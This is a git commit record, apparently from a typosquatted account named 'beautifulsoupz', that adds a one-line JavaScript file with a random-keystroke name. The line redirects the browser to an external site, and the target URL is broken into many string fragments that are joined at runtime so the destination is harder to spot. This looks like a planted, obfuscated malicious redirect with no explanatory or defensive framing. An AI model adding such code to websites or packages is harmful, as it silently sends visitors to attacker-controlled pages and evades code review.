88c968797e200fefc7c4c2b54d8fcacb51c5dc9d
beautifulsoupz <77855946+crossrevicerszedorton@users.noreply.github.com>
2023-01-02 17:35:18 +0100

    Create kjhrefjekrghelkhfklhflekhflk.js

---
+++ kjhrefjekrghelkhfklhflekhflk.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`htt`,`ps://www.`,`roadswork`,`s.com/V0p0ljJ`,`EcXBBoh1Zf2`,`-7czp3JD9-5D`,`7oegGKwE4N`,`K60u8Pu`,`ZhPzd`,`xxQy8xegf`,`80uEY6`,`9`,`S27YRQi`,`OYsaa6q9l2w~~`))
